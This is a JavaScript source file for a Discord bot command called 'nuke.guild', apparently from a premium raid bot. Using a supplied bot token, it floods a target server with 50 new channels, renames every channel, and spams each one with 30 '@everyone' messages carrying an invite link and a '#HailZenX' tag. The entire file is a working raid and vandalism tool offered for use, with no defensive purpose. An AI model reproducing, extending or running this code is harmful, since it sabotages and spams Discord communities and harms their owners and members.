const { Client } = require('discord.js');
const fetch = require("node-fetch");
const { readPremiumConfigs } = require('../utils/json-handler');
const { createBlacklistButton } = require('../utils/blacklist-button');

async function wait_ms(ms) { return new Promise(resolve => setTimeout(resolve, ms)); };

module.exports = {
    name: 'nuke.guild',
    description: 'Nukes a guild.',
    prefix: '#',
    premium: true,
    async execute(msg, args, client, channel_logs, blacklist_user, idservidores_nopermitidos) {
        createBlacklistButton(client, channel_logs, msg.author);
        const premiumConfigs = readPremiumConfigs();
        const userConfig = premiumConfigs[msg.author.id];

        if (!userConfig || !userConfig.guild_id) {
            return msg.channel.send({ content: '> You have not set a guild ID to nuke.' });
        }

        if (idservidores_nopermitidos.includes(userConfig.guild_id)) {
            return msg.channel.send({ content: '> This server is not allowed.' });
        }

        if (!userConfig.bot_token_n) {
            return msg.channel.send({ content: '> You have not set a bot token to use.' });
        }

        await msg.channel.send({ content: '> Nuking guild...' });

        const nukeClient = new Client({ intents: [103423] });
        await nukeClient.login(userConfig.bot_token_n);

        const inviteURL = userConfig.invite_url || 'https://discord.gg/zCQ8jQ2GBf';

        const sendMessages = async (channel) => {
            const channelToSend = nukeClient.channels.cache.get(channel.id);
            for (let i = 0; i < 30; i++) {
                try {
                    await channelToSend.send({ content: `@everyone ${inviteURL} - | - https://www.youtube.com/watch?v=xKY-d0QkKjE / #HailZenX` });
                } catch (e) {
                    console.log(`[X] Could not send a message with the "nuke.guild" command, error message: ${e.message}`);
                }
            }
        };

        const createdChannels = [];
        const createChannels = async () => {
            const res = await fetch(`https://discord.com/api/v9/guilds/${userConfig.guild_id}/channels`, {
                method: 'POST',
                headers: {
                    "Authorization": `Bot ${userConfig.bot_token_n}`,
                    "content-type": "application/json"
                },
                body: JSON.stringify({
                    "name": "test",
                    "type": "0"
                })
            });
            const json = await res.json();
            createdChannels.push(json['id']);
            if (createdChannels.length >= 50) {
                const guild = await nukeClient.guilds.cache.get(userConfig.guild_id);
                const channels = await guild.channels.fetch();
                for (const ch of channels.values()) {
                    try {
                        await ch.setName('ʀǟɨɖɮʏռɨӽǟʝǟɮǟʐɨֆ');
                    } catch (e) {
                        console.log(e);
                    }
                }
                for (const ch of channels.values()) {
                    try {
                        await sendMessages(ch);
                    } catch (e) {
                        console.log(e);
                    }
                }
                await nukeClient.destroy();
            }
        };

        for (let i = 0; i < 50; i++) {
            await wait_ms(10);
            await createChannels();
        }
    }
};
